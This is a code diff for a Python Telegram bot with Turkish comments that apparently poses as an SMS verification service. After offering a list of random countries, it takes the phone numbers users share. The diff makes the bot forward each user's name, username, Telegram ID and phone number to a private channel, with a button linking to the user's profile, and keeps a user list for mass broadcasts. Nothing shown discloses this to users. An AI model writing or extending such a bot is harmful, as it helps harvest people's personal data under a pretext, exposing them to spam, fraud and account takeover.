@@ -2,7 +2,9 @@ from telegram import (
     Update,
     KeyboardButton,
     ReplyKeyboardMarkup,
-    Contact
+    Contact,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup
 )
 from telegram.ext import (
     ApplicationBuilder,
@@ -19,12 +21,12 @@ import os
 # ENV DEĞERLERİ
 TOKEN = os.getenv("BOT_TOKEN")
 KANAL_ID = os.getenv("KANAL_ID")
-ADMIN_ID = int(os.getenv("ADMIN_ID"))   # <-- Railway .env içine ekleniyor
+ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
 TIMEZONE = pytz.timezone("Europe/Istanbul")
 
-# KULLANICILARI KAYDETME
-kullanicilar = set()
+# KULLANICI VERİLERİ
+kullanicilar = {}   # {user_id: {"username": "", "name": ""}}
 kullanici_durum = {}
 
 ulkeler = [
@@ -36,9 +38,24 @@ ulkeler = [
     ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
 ]
 
+# --------------------------
+# KULLANICI KAYDET
+# --------------------------
+def kullanici_kaydet(user):
+    username = f"@{user.username}" if user.username else "Yok"
+    name = user.first_name or "Bilinmiyor"
+
+    kullanicilar[user.id] = {
+        "username": username,
+        "name": name
+    }
+
+# --------------------------
+# START
+# --------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    kullanicilar.add(user.id)  # START ATAN HERKES KAYDEDİLİR
+    kullanici_kaydet(user)
 
     ad = user.username or user.first_name
     await update.message.reply_text(
@@ -49,6 +66,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     )
 
+# --------------------------
+# SMS ONAYLA
+# --------------------------
 async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
     secilen = random.sample(ulkeler, 15)
     butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
@@ -59,9 +79,15 @@ async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
     )
 
+# --------------------------
+# MESAJ HANDLER
+# --------------------------
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    kullanici_kaydet(user)
+
     text = update.message.text
-    uid = update.effective_user.id
+    uid = user.id
 
     if text == "💬 SMS Onayla":
         await sms_onayla(update, context)
@@ -79,33 +105,51 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         )
 
+# --------------------------
+# NUMARA GELDİĞİNDE
+# --------------------------
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
+    user = update.effective_user
+    kullanici_kaydet(user)
+
+    uid = user.id
+
     if not kullanici_durum.get(uid):
         return
 
     c: Contact = update.message.contact
     zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
 
+    info = kullanicilar.get(uid, {})
+    username = info.get("username", "Yok")
+    name = info.get("name", "Bilinmiyor")
+
+    # Profil butonu
+    buton = InlineKeyboardMarkup([
+        [InlineKeyboardButton("👤 Profili Aç", url=f"tg://user?id={uid}")]
+    ])
+
     await context.bot.send_message(
         chat_id=KANAL_ID,
+        reply_markup=buton,
         text=(
             "☎️ NUMARA ALINDI\n\n"
-            f"👤 {c.first_name}\n"
-            f"📱 +{c.phone_number}\n"
-            f"⏰ {zaman}"
+            f"👤 İsim: {name}\n"
+            f"🔗 Kullanıcı: {username}\n"
+            f"🆔 ID: {uid}\n"
+            f"📱 Numara: +{c.phone_number}\n"
+            f"⏰ Saat: {zaman}"
         )
     )
 
     await update.message.reply_text("Alındı ✅")
     kullanici_durum[uid] = False
 
-# ------------------------------
-# 🔥 DUYURU KOMUTU + ADMIN KONTROL
-# ------------------------------
+# --------------------------
+# DUYURU (SADECE ADMIN)
+# --------------------------
 async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
-    # SADECE ADMIN KULLANABİLİR
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ Bu komutu sadece admin kullanabilir.")
         return
@@ -117,7 +161,7 @@ async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
     mesaj = " ".join(context.args)
     sayi = 0
 
-    for uid in list(kullanicilar):
+    for uid in list(kullanicilar.keys()):
         try:
             await context.bot.send_message(chat_id=uid, text=mesaj)
             sayi += 1
@@ -126,6 +170,9 @@ async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"📢 Duyuru gönderildi ({sayi} kişiye).")
 
+# --------------------------
+# MAIN
+# --------------------------
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
 
@@ -134,6 +181,7 @@ def main():
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
+    print("Bot aktif...")
     app.run_polling()
 
 if __name__ == "__main__":
